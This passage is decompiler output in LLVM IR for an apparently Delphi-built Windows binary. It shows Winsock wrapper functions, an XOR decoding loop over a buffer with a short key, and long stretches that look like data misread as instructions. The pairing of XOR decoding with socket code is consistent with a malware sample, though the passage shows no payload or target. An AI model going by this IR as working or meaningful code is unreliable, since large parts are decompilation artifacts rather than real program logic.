  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_40a664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_40a664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_40a664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ecx = alloca i32, align 4
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = bitcast i32* %ecx to i8*
  %22 = load i8, i8* %21, align 4, !insn.addr !239
  %23 = add i8 %22, %15, !insn.addr !239
  %24 = load i32, i32* %ecx, align 4, !insn.addr !239
  %25 = inttoptr i32 %24 to i8*, !insn.addr !239
  store i8 %23, i8* %25, align 1, !insn.addr !239
  %26 = load i8, i8* %5, align 4, !insn.addr !240
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !240
  %29 = add i8 %26, %28, !insn.addr !240
  %30 = inttoptr i32 %27 to i8*, !insn.addr !240
  store i8 %29, i8* %30, align 1, !insn.addr !240
  %31 = load i8, i8* %5, align 4, !insn.addr !241
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !241
  %34 = add i8 %31, %33, !insn.addr !241
  %35 = inttoptr i32 %32 to i8*, !insn.addr !241
  store i8 %34, i8* %35, align 1, !insn.addr !241
  %36 = load i8, i8* %5, align 4, !insn.addr !242
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !242
  %39 = add i8 %36, %38, !insn.addr !242
  %40 = inttoptr i32 %37 to i8*, !insn.addr !242
  store i8 %39, i8* %40, align 1, !insn.addr !242
  %41 = add i32 %0, -117, !insn.addr !243
  %42 = inttoptr i32 %41 to i8*, !insn.addr !243
  %43 = load i8, i8* %42, align 1, !insn.addr !243
  %44 = trunc i32 %2 to i8, !insn.addr !243
  %45 = add i8 %43, %44, !insn.addr !243
  store i8 %45, i8* %42, align 1, !insn.addr !243
  %46 = trunc i32 %2 to i16, !insn.addr !244
  %47 = call i8 @__asm_in(i16 %46), !insn.addr !244
  %48 = add i32 %20, -8, !insn.addr !245
  %49 = inttoptr i32 %48 to i32*, !insn.addr !245
  store i32 4212417, i32* %49, align 4, !insn.addr !245
  %50 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %51 = add i32 %20, -12, !insn.addr !246
  %52 = inttoptr i32 %51 to i32*, !insn.addr !246
  store i32 %50, i32* %52, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !247
  %53 = load i32, i32* @global_var_40a678, align 4, !insn.addr !248
  %54 = add i32 %53, 1, !insn.addr !248
  %55 = icmp eq i32 %54, 0, !insn.addr !248
  store i32 %54, i32* @global_var_40a678, align 4, !insn.addr !248
  %56 = icmp eq i1 %55, false, !insn.addr !249
  br i1 %56, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %57 = call i32 @"@LStrClr"(), !insn.addr !250
  %58 = call i32 @"@LStrClr"(), !insn.addr !251
  %59 = call i32 @"@LStrClr"(), !insn.addr !252
  %60 = call i32 @"@LStrClr"(), !insn.addr !253
  %61 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %62 = add i32 %20, -4, !insn.addr !255
  %63 = inttoptr i32 %62 to i32*, !insn.addr !255
  %64 = load i32, i32* %52, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %64), !insn.addr !257
  store i32 4212424, i32* %63, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_40a678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4090d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40a67c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40a67c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a67c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40a67c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_40a680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_40a680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_40a680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_40a684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_40a684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_40a684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404810:
  %.pre-phi.reg2mem = alloca i8*, !insn.addr !322
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %5 = add i32 %1, 117, !insn.addr !322
  %6 = inttoptr i32 %5 to i32*, !insn.addr !322
  %7 = load i32, i32* %6, align 4, !insn.addr !322
  %8 = mul i32 %7, 808467313, !insn.addr !322
  br i1 %4, label %dec_label_pc_404891, label %dec_label_pc_40481b, !insn.addr !323

dec_label_pc_40481b:                              ; preds = %dec_label_pc_404810
  %9 = load i32, i32* inttoptr (i32 812544100 to i32*), align 4, !insn.addr !324
  %10 = sub i32 %0, %9, !insn.addr !324
  %11 = xor i32 %8, %3, !insn.addr !325
  %12 = inttoptr i32 %10 to i32*, !insn.addr !326
  %13 = load i32, i32* %12, align 4, !insn.addr !326
  %14 = xor i32 %11, %13, !insn.addr !326
  store i32 %14, i32* %12, align 4, !insn.addr !326
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !327
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !327
  %19 = add i8 %16, %18, !insn.addr !327
  %20 = inttoptr i32 %17 to i8*, !insn.addr !327
  store i8 %19, i8* %20, align 1, !insn.addr !327
  %21 = load i8, i8* %15, align 4, !insn.addr !328
  %22 = load i32, i32* %eax, align 4
  %23 = trunc i32 %22 to i8, !insn.addr !328
  %24 = add i8 %21, %23, !insn.addr !328
  %25 = inttoptr i32 %22 to i8*, !insn.addr !328
  store i8 %24, i8* %25, align 1, !insn.addr !328
  %26 = load i8, i8* %15, align 4, !insn.addr !329
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !329
  %29 = add i8 %26, %28, !insn.addr !329
  %30 = inttoptr i32 %27 to i8*, !insn.addr !329
  store i8 %29, i8* %30, align 1, !insn.addr !329
  %31 = load i8, i8* %15, align 4, !insn.addr !330
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !330
  %34 = add i8 %31, %33, !insn.addr !330
  %35 = inttoptr i32 %32 to i8*, !insn.addr !330
  store i8 %34, i8* %35, align 1, !insn.addr !330
  %36 = load i8, i8* %15, align 4, !insn.addr !331
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !331
  %39 = add i8 %36, %38, !insn.addr !331
  %40 = inttoptr i32 %37 to i8*, !insn.addr !331
  store i8 %39, i8* %40, align 1, !insn.addr !331
  %41 = load i8, i8* %15, align 4, !insn.addr !332
  %42 = load i32, i32* %eax, align 4
  %43 = trunc i32 %42 to i8, !insn.addr !332
  %44 = add i8 %41, %43, !insn.addr !332
  %45 = inttoptr i32 %42 to i8*, !insn.addr !332
  store i8 %44, i8* %45, align 1, !insn.addr !332
  %46 = load i8, i8* %15, align 4, !insn.addr !333
  %47 = load i32, i32* %eax, align 4
  %48 = trunc i32 %47 to i8, !insn.addr !333
  %49 = add i8 %46, %48, !insn.addr !333
  %50 = inttoptr i32 %47 to i8*, !insn.addr !333
  store i8 %49, i8* %50, align 1, !insn.addr !333
  %51 = load i8, i8* %15, align 4, !insn.addr !334
  %52 = load i32, i32* %eax, align 4
  %53 = trunc i32 %52 to i8, !insn.addr !334
  %54 = add i8 %51, %53, !insn.addr !334
  %55 = inttoptr i32 %52 to i8*, !insn.addr !334
  store i8 %54, i8* %55, align 1, !insn.addr !334
  %56 = load i8, i8* %15, align 4, !insn.addr !335
  %57 = load i32, i32* %eax, align 4
  %58 = trunc i32 %57 to i8, !insn.addr !335
  %59 = add i8 %56, %58, !insn.addr !335
  %60 = inttoptr i32 %57 to i8*, !insn.addr !335
  store i8 %59, i8* %60, align 1, !insn.addr !335
  %61 = load i8, i8* %15, align 4, !insn.addr !336
  %62 = load i32, i32* %eax, align 4
  %63 = trunc i32 %62 to i8, !insn.addr !336
  %64 = add i8 %61, %63, !insn.addr !336
  %65 = inttoptr i32 %62 to i8*, !insn.addr !336
  store i8 %64, i8* %65, align 1, !insn.addr !336
  %66 = load i8, i8* %15, align 4, !insn.addr !337
  %67 = load i32, i32* %eax, align 4
  %68 = trunc i32 %67 to i8, !insn.addr !337
  %69 = add i8 %66, %68, !insn.addr !337
  %70 = inttoptr i32 %67 to i8*, !insn.addr !337
  store i8 %69, i8* %70, align 1, !insn.addr !337
  %71 = load i8, i8* %15, align 4, !insn.addr !338
  %72 = load i32, i32* %eax, align 4
  %73 = trunc i32 %72 to i8, !insn.addr !338
  %74 = add i8 %71, %73, !insn.addr !338
  %75 = inttoptr i32 %72 to i8*, !insn.addr !338
  store i8 %74, i8* %75, align 1, !insn.addr !338
  %76 = load i8, i8* %15, align 4, !insn.addr !339
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !339
  %79 = add i8 %76, %78, !insn.addr !339
  %80 = inttoptr i32 %77 to i8*, !insn.addr !339
  store i8 %79, i8* %80, align 1, !insn.addr !339
  %81 = load i8, i8* %15, align 4, !insn.addr !340
  %82 = load i32, i32* %eax, align 4
  %83 = trunc i32 %82 to i8, !insn.addr !340
  %84 = add i8 %81, %83, !insn.addr !340
  %85 = inttoptr i32 %82 to i8*, !insn.addr !340
  store i8 %84, i8* %85, align 1, !insn.addr !340
  %86 = load i8, i8* %15, align 4, !insn.addr !341
  %87 = load i32, i32* %eax, align 4
  %88 = trunc i32 %87 to i8, !insn.addr !341
  %89 = add i8 %86, %88, !insn.addr !341
  %90 = inttoptr i32 %87 to i8*, !insn.addr !341
  store i8 %89, i8* %90, align 1, !insn.addr !341
  %91 = load i8, i8* %15, align 4, !insn.addr !342
  %92 = load i32, i32* %eax, align 4
  %93 = trunc i32 %92 to i8, !insn.addr !342
  %94 = add i8 %91, %93, !insn.addr !342
  %95 = inttoptr i32 %92 to i8*, !insn.addr !342
  store i8 %94, i8* %95, align 1, !insn.addr !342
  %96 = load i8, i8* %15, align 4, !insn.addr !343
  %97 = load i32, i32* %eax, align 4
  %98 = trunc i32 %97 to i8, !insn.addr !343
  %99 = add i8 %96, %98, !insn.addr !343
  %100 = inttoptr i32 %97 to i8*, !insn.addr !343
  store i8 %99, i8* %100, align 1, !insn.addr !343
  %101 = load i8, i8* %15, align 4, !insn.addr !344
  %102 = load i32, i32* %eax, align 4
  %103 = trunc i32 %102 to i8, !insn.addr !344
  %104 = add i8 %101, %103, !insn.addr !344
  %105 = inttoptr i32 %102 to i8*, !insn.addr !344
  store i8 %104, i8* %105, align 1, !insn.addr !344
  %106 = load i8, i8* %15, align 4, !insn.addr !345
  %107 = load i32, i32* %eax, align 4
  %108 = trunc i32 %107 to i8, !insn.addr !345
  %109 = add i8 %106, %108, !insn.addr !345
  %110 = inttoptr i32 %107 to i8*, !insn.addr !345
  store i8 %109, i8* %110, align 1, !insn.addr !345
  %111 = load i8, i8* %15, align 4, !insn.addr !346
  %112 = load i32, i32* %eax, align 4
  %113 = trunc i32 %112 to i8, !insn.addr !346
  %114 = add i8 %111, %113, !insn.addr !346
  %115 = icmp ult i8 %114, %111, !insn.addr !346
  %116 = inttoptr i32 %112 to i8*, !insn.addr !346
  store i8 %114, i8* %116, align 1, !insn.addr !346
  br i1 %115, label %dec_label_pc_4048ce, label %dec_label_pc_404856, !insn.addr !347

dec_label_pc_404856:                              ; preds = %dec_label_pc_40481b
  %117 = load i32, i32* %eax, align 4, !insn.addr !347
  ret i32 %117, !insn.addr !347

dec_label_pc_404891:                              ; preds = %dec_label_pc_404810
  %118 = bitcast i32* %eax to i8*
  %119 = load i8, i8* %118, align 4, !insn.addr !348
  %120 = load i32, i32* %eax, align 4
  %121 = trunc i32 %120 to i8, !insn.addr !348
  %122 = add i8 %119, %121, !insn.addr !348
  %123 = inttoptr i32 %120 to i8*, !insn.addr !348
  store i8 %122, i8* %123, align 1, !insn.addr !348
  %124 = load i8, i8* %118, align 4, !insn.addr !349
  %125 = load i32, i32* %eax, align 4
  %126 = trunc i32 %125 to i8, !insn.addr !349
  %127 = add i8 %124, %126, !insn.addr !349
  %128 = inttoptr i32 %125 to i8*, !insn.addr !349
  store i8 %127, i8* %128, align 1, !insn.addr !349
  %129 = load i8, i8* %118, align 4, !insn.addr !350
  %130 = load i32, i32* %eax, align 4
  %131 = trunc i32 %130 to i8, !insn.addr !350
  %132 = add i8 %129, %131, !insn.addr !350
  %133 = inttoptr i32 %130 to i8*, !insn.addr !350
  store i8 %132, i8* %133, align 1, !insn.addr !350
  %134 = bitcast i32* %ebx to i8*
  %135 = load i8, i8* %134, align 4, !insn.addr !351
  %136 = udiv i32 %2, 256, !insn.addr !351
  %137 = trunc i32 %136 to i8, !insn.addr !351
  %138 = add i8 %135, %137, !insn.addr !351
  %139 = load i32, i32* %ebx, align 4, !insn.addr !351
  %140 = inttoptr i32 %139 to i8*, !insn.addr !351
  store i8 %138, i8* %140, align 1, !insn.addr !351
  %141 = addrspacecast i32* %ebx to i32 addrspace(258)*
  %142 = load i32, i32 addrspace(258)* %141, align 4
  %143 = xor i32 %142, %8, !insn.addr !352
  %144 = inttoptr i32 %142 to i32 addrspace(258)*, !insn.addr !352
  store i32 %143, i32 addrspace(258)* %144, align 4, !insn.addr !352
  %145 = load i32, i32* inttoptr (i32 1093810230 to i32*), align 4, !insn.addr !353
  %146 = icmp ult i32 %145, %8, !insn.addr !353
  %147 = load i8, i8* %118, align 4
  %148 = load i32, i32* %eax, align 4
  %149 = trunc i32 %148 to i8
  %150 = add i8 %147, %149
  %151 = inttoptr i32 %148 to i8*
  store i8 %150, i8* %151, align 1
  %152 = load i8, i8* %118, align 4
  %153 = load i32, i32* %eax, align 4
  %154 = trunc i32 %153 to i8
  %155 = add i8 %152, %154
  %156 = inttoptr i32 %153 to i8*
  store i8 %155, i8* %156, align 1
  %157 = load i8, i8* %118, align 4
  %158 = load i32, i32* %eax, align 4
  %159 = trunc i32 %158 to i8
  %160 = add i8 %157, %159
  %161 = inttoptr i32 %158 to i8*
  store i8 %160, i8* %161, align 1
  %162 = load i8, i8* %118, align 4
  %163 = load i32, i32* %eax, align 4
  %164 = trunc i32 %163 to i8
  %165 = add i8 %162, %164
  %166 = inttoptr i32 %163 to i8*
  store i8 %165, i8* %166, align 1
  %167 = load i8, i8* %118, align 4
  %168 = load i32, i32* %eax, align 4
  %169 = trunc i32 %168 to i8
  %170 = add i8 %167, %169
  br i1 %146, label %dec_label_pc_404916, label %dec_label_pc_4048a4, !insn.addr !354

dec_label_pc_4048a4:                              ; preds = %dec_label_pc_404891
  %171 = inttoptr i32 %168 to i8*, !insn.addr !355
  store i8 %170, i8* %171, align 1, !insn.addr !355
  %172 = load i8, i8* %118, align 4, !insn.addr !356
  %173 = load i32, i32* %eax, align 4
  %174 = trunc i32 %173 to i8, !insn.addr !356
  %175 = add i8 %172, %174, !insn.addr !356
  %176 = inttoptr i32 %173 to i8*, !insn.addr !356
  store i8 %175, i8* %176, align 1, !insn.addr !356
  %177 = load i8, i8* %118, align 4, !insn.addr !357
  %178 = load i32, i32* %eax, align 4
  %179 = trunc i32 %178 to i8, !insn.addr !357
  %180 = add i8 %177, %179, !insn.addr !357
  %181 = inttoptr i32 %178 to i8*, !insn.addr !357
  store i8 %180, i8* %181, align 1, !insn.addr !357
  %182 = load i8, i8* %118, align 4, !insn.addr !358
  %183 = load i32, i32* %eax, align 4
  %184 = trunc i32 %183 to i8, !insn.addr !358
  %185 = add i8 %182, %184, !insn.addr !358
  %186 = inttoptr i32 %183 to i8*, !insn.addr !358
  store i8 %185, i8* %186, align 1, !insn.addr !358
  %187 = load i8, i8* %118, align 4, !insn.addr !359
  %188 = load i32, i32* %eax, align 4
  %189 = trunc i32 %188 to i8, !insn.addr !359
  %190 = add i8 %187, %189, !insn.addr !359
  %191 = inttoptr i32 %188 to i8*, !insn.addr !359
  store i8 %190, i8* %191, align 1, !insn.addr !359
  %192 = load i8, i8* %118, align 4, !insn.addr !360
  %193 = load i32, i32* %eax, align 4
  %194 = trunc i32 %193 to i8, !insn.addr !360
  %195 = add i8 %192, %194, !insn.addr !360
  %196 = inttoptr i32 %193 to i8*, !insn.addr !360
  store i8 %195, i8* %196, align 1, !insn.addr !360
  %197 = load i8, i8* %118, align 4, !insn.addr !361
  %198 = load i32, i32* %eax, align 4
  %199 = trunc i32 %198 to i8, !insn.addr !361
